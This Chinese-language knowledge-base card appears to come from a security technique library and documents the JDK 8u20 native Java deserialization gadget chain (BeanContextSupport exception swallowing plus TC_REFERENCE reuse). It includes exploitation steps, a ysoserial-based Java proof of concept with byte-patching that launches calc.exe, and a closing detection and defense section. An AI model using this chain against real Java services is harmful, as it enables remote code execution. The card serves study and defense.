---
id: web-java-deserialization-jdk-8u20-beancontextsupport-native-chain
title: JDK 8u20 原生链：BeanContextSupport 吞异常 + TC_REFERENCE 复用 AnnotationInvocationHandler
type: scenario
domain: web
path: web/java/deserialization/jdk
technique: jdk-beancontextsupport-tc-reference-native-chain
aliases:
- JDK 8u20 原生链
- 7u21 绕过
- BeanContextSupport readChildren 吞异常
- TC_REFERENCE 复用对象
- AnnotationInvocationHandler 原生反序列化
- SC_WRITE_METHOD 修补
tags:
- java
- deserialization
- gadget
- native-chain
- annotationinvocationhandler
- beancontextsupport
- templatesimpl
- tc-reference
- jdk8u20
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: JDK 1.8.0_20（原文实测）；用于绕过 7u21 的 AnnotationInvocationHandler 校验，validateAnnotationMethods 仅允许 toString/hashCode/annotationType 后失效
verification:
  verified_by: verifier-V16
  verified_at: '2026-11-05T02:01:54+08:00'
  notes: 已对照原文与20张图片逐段核对：图01 HashMap.putVal equals；图02/12 BeanContextSupport.readChildren catch IOException/CNFE continue；图03/04 defaultDataEnd→readBlockHeader return -1→readInt EOF；图05/09 defaultReadObject 置 true、invokeReadObject finally 复位 false；图06/18 TC_NULL/TC_BLOCKDATA 布局；图10/11 AnnotationInvocationHandler InvalidObjectException；图14-17 吞异常后 deserialize readInt 错位；图19 修补后 JDK1.8.0_20 弹出计算器；图20 validateAnnotationMethods 仅允许 toString/hashCode/annotationType。卡内 SC_WRITE_METHOD 0x02→0x03、删除 TC_NULL、TC_REFERENCE 复用等细节与原文一致。affected_versions 已按原文 1.8.0_20 与 8u20 加固填写，未猜测新区间。PoC 未本机执行；frontmatter无sources/source_url。
---

## 一句话结论

当目标 JDK 的 `AnnotationInvocationHandler.readObject` 已加入类型/成员方法校验、直接反序列化它会被拒绝时，可以先用 `BeanContextSupport.readChildren` 的双层 try/catch 把这次异常吞掉——对象本身已由 `defaultReadObject` 还原并登记到句柄表；再用序列化流的 `TC_REFERENCE` 让后续 `Templates` 代理复用同一个 `AnnotationInvocationHandler` 实例，绕开第二次校验，最终由 `LinkedHashSet` 插入时的 hash 碰撞触发 `proxy.equals(templates)`，在 `equalsImpl` 里调用 `TemplatesImpl.newTransformer()` 执行任意字节码。该链还需修补序列化流两处字节（ClassDescFlags 加 `SC_WRITE_METHOD`、删掉未读的 `TC_NULL`）才能让整个流对齐。

## 原理

- **7u21 链的目标**：`AnnotationInvocationHandler(type=Templates.class, memberValues={"f5a5a608": TemplatesImpl})` 作为 `Templates` 代理的 handler；`LinkedHashSet` 里同时放入 `TemplatesImpl` 与代理。反序列化 `LinkedHashSet` 时，代理与 `TemplatesImpl` 哈希相同，HashMap 比较键调用 `proxy.equals(templates)` → `AnnotationInvocationHandler.equalsImpl` 遍历 `Templates` 接口的每个方法并在 `templates` 上反射调用，其中 `newTransformer()` 触发 `TemplatesImpl` 的 `defineClass`，执行恶意字节码。
- **哈希为什么相同**：`"f5a5a608".hashCode()` 恰好为 0；`AnnotationInvocationHandler.hashCodeImpl` 对 `{"f5a5a608": templates}` 计算 `(127 * 0) ^ templates.hashCode()`，结果等于 `templates.hashCode()`，从而落入同一哈希桶并触发 `equals`。
- **7u21 之后的校验**：`AnnotationInvocationHandler.readObject` 在 `defaultReadObject()` 之后检查 `type` 是否为注解、成员方法是否合法；`type=Templates.class` 会抛 `InvalidObjectException`（`IOException` 子类），正常的反序列化流直接中断，代理拿不到可用的 handler。
- **第一层绕过：BeanContextSupport 双层 try/catch**。`BeanContextSupport.readObject` 在 `serializable > 0` 时调用 `readChildren(ois)`，后者：
  ```java
  try {
      child = ois.readObject();
      bsc c = (BeanContextSupport.BCSChild) ois.readObject();
  } catch (IOException ioe) { continue; }
    catch (ClassNotFoundException cnfe) { continue; }
  ```
  `InvalidObjectException` 继承自 `IOException`，会被 `catch (IOException)` 吞掉并 `continue`。关键在于异常发生在 `defaultReadObject()` **之后**：`type`、`memberValues` 等字段已经写入该 `AnnotationInvocationHandler` 实例，对象也已登记进 `ObjectInputStream` 的句柄表。异常只终止了它自己的 `readObject`，对象本身仍然可用。
- **第二层绕过：TC_REFERENCE 复用**。Java 序列化对同一对象只完整写一次，之后写 `TC_REFERENCE(0x71)+handle`（首个 handle 为 `0x7E0000`）。把 `AnnotationInvocationHandler` 先作为 `children` map 的 key 序列化，再把同一个实例设为代理的 handler：流中第二处只是 `TC_REFERENCE`。反序列化代理时直接取句柄表里那个已还原的实例，不会再调用它的 `readObject`，因此校验不会第二次触发。
- **对象编排**：`LinkedHashSet` 依次放 `BeanContextSupport`（包裹 ih，用于先还原）、`TemplatesImpl`、`Templates` 代理（handler 指向同一个 ih）。`BeanContextSupport` 的 `serializable` 反射设为 1，`children` 设为 `{ih: null}`，使 `readChildren` 进入循环并读到 ih。
- **流对齐修补 1：`SC_WRITE_METHOD`**。`ObjectInputStream.defaultReadObject` 若发现类描述没有 `SC_WRITE_METHOD`（即类没有 `writeObject`），会在读完字段后把 `defaultDataEnd` 置为 true，模拟自定义数据结束。正常路径在 `invokeReadObject` 返回后会把 `defaultDataEnd` 复位为 false；但 ih 的 `readObject` 抛异常，异常传播后复位语句被跳过，`defaultDataEnd` 保持 true。随后 `BeanContextSupport.deserialize` 调用 `ois.readInt()`，`readBlockHeader` 看到 `defaultDataEnd` 直接 `return -1`，`readInt` 收到 -1 抛 `EOFException`。把 `AnnotationInvocationHandler` 类描述的 flags 从 `0x02`（`SC_SERIALIZABLE`）改成 `0x03`（加上 `SC_WRITE_METHOD=0x01`），`defaultReadObject` 就不再置位，`readInt` 可以正常读块数据。
- **流对齐修补 2：删除未读的 `TC_NULL`**。ih 的 `readObject` 在读到 `children` map 的 value 之前就抛异常，流位置停在 key 之后的 `TC_NULL(0x70)`；`BeanContextSupport` catch 后直接进入 `deserialize(ois, bcmListeners)`，该方法先 `ois.readInt()`。`readInt` 期待的是 `TC_BLOCKDATA(0x77)+4 字节长度`，但当前位置是 `TC_NULL`，因此必须删掉这个 `TC_NULL` 字节，让后面的 `0x77 0x04 0x00 0x00 0x00 0x00` 对齐。这个 null 是未被读取的 map value，后续不会再用；只能删除、不能插入数据，否则会整体移位并破坏后续 `TC_REFERENCE` 与句柄对应关系。
- **最终触发**：`BeanContextSupport` 完成后，`LinkedHashSet` 继续反序列化 `TemplatesImpl` 与代理；插入代理时哈希碰撞调用 `proxy.equals(templates)`，进入未被校验拦截的 ih 实例的 `equalsImpl`，反射调用 `newTransformer()` 执行字节码。

## 触发条件

- 目标可反序列化攻击者可控的 Java 原生序列化流（`ObjectInputStream.readObject`、session、RMI、JMS、缓存等）。
- JDK 为含 `BeanContextSupport`、`AnnotationInvocationHandler`、`TemplatesImpl` 的版本；原文实测 `1.8.0_20`，且 `AnnotationInvocationHandler.readObject` 有 7u21 之后的类型校验、但尚未加入仅允许 `toString/hashCode/annotationType` 的加固。
- classpath 中存在 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`（JDK 自带 Xalan）。
- 攻击者能对序列化字节做偏移修改（生成阶段可离线修补，不需要目标端配合）。
- 需要 ysoserial 的 `Gadgets`/`Reflections`/`Serializer` 等辅助类来构造对象与序列化流（仅构造端使用）。

## 利用步骤

1. 用 `Gadgets.createTemplatesImpl(cmd)` 构造 `TemplatesImpl`（`_bytecodes` 内放继承 `AbstractTranslet` 的恶意类，静态/构造块执行命令）。
2. 反射创建 `sun.reflect.annotation.AnnotationInvocationHandler(Override.class, new HashMap())`，把 `type` 设为 `Templates.class`，`memberValues` 设为 `{"f5a5a608": templates}`。
3. 用该 handler 创建 `Templates` 动态代理。
4. 创建 `BeanContextSupport`，反射把 `serializable` 设为 1，`children` 设为 `{ih: null}`。
5. 构造 `LinkedHashSet`，依次 `add(b)`、`add(templates)`、`add(proxy)`，保证序列化顺序与反序列化顺序为 b → templates → proxy。
6. `Serializer.serialize(set)` 得到原始序列化字节。
7. 字节修补：
   - 找到 `AnnotationInvocationHandler` 类描述的 flags `0x02`，改为 `0x03`；
   - 找到 `TC_NULL` 后紧跟 `TC_BLOCKDATA len=4 count=0` 的位置，删除这个 `0x70`。
8. 把修补后的字节交给目标反序列化；`newTransformer()` 执行 `TemplatesImpl` 中的字节码（原文用 `calc.exe` 验证）。

## PoC

构造与修补（基于 ysoserial 辅助类，结构示意）：

```java
TemplatesImpl templates = (TemplatesImpl) Gadgets.createTemplatesImpl("calc.exe");

InvocationHandler ih = (InvocationHandler) Reflections
    .getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler")
    .newInstance(Override.class, new HashMap<>());
Reflections.setFieldValue(ih, "type", Templates.class);
Templates proxy = Gadgets.createProxy(ih, Templates.class);

BeanContextSupport b = new BeanContextSupport();
Reflections.setFieldValue(b, "serializable", 1);
HashMap<Object, Object> children = new HashMap<>();
children.put(ih, null);                 // key 先序列化，value null 稍后会被异常打断
Reflections.setFieldValue(b, "children", children);

LinkedHashSet<Object> set = new LinkedHashSet<>();
set.add(b);                             // 先还原 ih，异常被 BeanContextSupport 吞掉
set.add(templates);                     // 提供 hash 碰撞与执行目标
set.add(proxy);                         // handler 以 TC_REFERENCE 复用 ih

HashMap<String, Object> memberValues = new HashMap<>();
memberValues.put("f5a5a608", templates); // 该字符串 hashCode()==0，保证代理与 templates 同 hash
Reflections.setFieldValue(ih, "memberValues", memberValues);

byte[] ser = Serializer.serialize(set);

// 1) AnnotationInvocationHandler 的 ClassDescFlags: 0x02 -> 0x03，加 SC_WRITE_METHOD
int i = ByteUtil.getSubarrayIndex(ser, new byte[]{0x02, 0x00, 0x02});
ser = ByteUtil.deleteAt(ser, i);
ser = ByteUtil.addAtIndex(ser, i, (byte) 0x03);

// 2) 删除 readObject 抛异常前未读的 TC_NULL(0x70)
byte[] nullAndBlock = new byte[]{0x70, 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x78, 0x71};
int j = ByteUtil.getSubarrayIndex(ser, nullAndBlock);
ser = ByteUtil.deleteAt(ser, j);

Deserializer.deserialize(ser);
```

说明：这是 ysoserial 风格的离线构造，`ByteUtil.deleteAt`/`addAtIndex` 是原文使用的工具方法；`0x02,0x00,0x02` 与 `nullAndBlock` 的位置依赖具体 JDK/序列化布局，实际利用需先用 SerializationDumper/zkar 定位。原文在 `jdk1.8.0_20` 上运行后弹出计算器、进程退出码 0。

## 变体与关联

- `TC_REFERENCE` 是所有“同一对象复用”链的通用基础：只要目标对象的 `readObject` 只允许成功执行一次或被校验拦截，就可以先用一个能吞异常的容器（`BeanContextSupport`、`PriorityQueue` 等存在 catch-continue 语义的类）把它还原，再用引用拿到实例。
- 双层 try/catch 的要点是外层 catch 的异常类型必须覆盖内层抛出的异常：`InvalidObjectException extends IOException` 才能被 `catch (IOException)` 捕获；若内层抛 `RuntimeException` 或 `Error`，此路径失效。
- 序列化流修补是通用技巧：`SC_WRITE_METHOD` 可影响 `defaultDataEnd` 状态；删除/插入 token 必须保证后续 `TC_REFERENCE` 句柄与块长度对齐。类似修补也用于绕过 `readObject` 提前异常留下的流错位。
- 与 7u21 原链的关系：本链复用同一 `TemplatesImpl + AnnotationInvocationHandler.equalsImpl` 触发段，新增的是“异常吞掉 + 引用复用 + 流修补”三层绕过。
- 文末加固：`AnnotationInvocationHandler.validateAnnotationMethods` 只允许 `toString/hashCode/annotationType` 三个方法签名，`Templates` 的 `newTransformer/getOutputProperties` 会导致校验失败，该链失效。

## 检测与防御

- 反序列化入口禁止接受原生 Java 序列化流；使用 `ObjectInputFilter`（JEP 290）限制类白名单，重点拒绝 `BeanContextSupport`、`AnnotationInvocationHandler`、`TemplatesImpl`、`LinkedHashSet` 组合及异常大的嵌套深度。
- 升级 JDK 到包含 `validateAnnotationMethods` 加固的版本；该链依赖旧版 `AnnotationInvocationHandler` 的校验缺口。
- 运行时检测：反序列化流中出现 `AnnotationInvocationHandler` 后紧跟 `TC_REFERENCE`、`BeanContextSupport` 的 `serializable>0`、类描述 flags 被改为 `0x03` 等异常字节；`TemplatesImpl.newTransformer`/`defineClass` 调用链。
- 代码审计：搜索 `ObjectInputStream.readObject` 处理外部输入的入口，以及 `BeanContextSupport` 反序列化可达性；不要仅依赖类黑名单。
- 防御纵深：对反序列化流做完整性与长度校验，禁止客户端直接提交序列化字节；启用 RASP/EDR 对 `defineClass`、`newTransformer` 的告警。
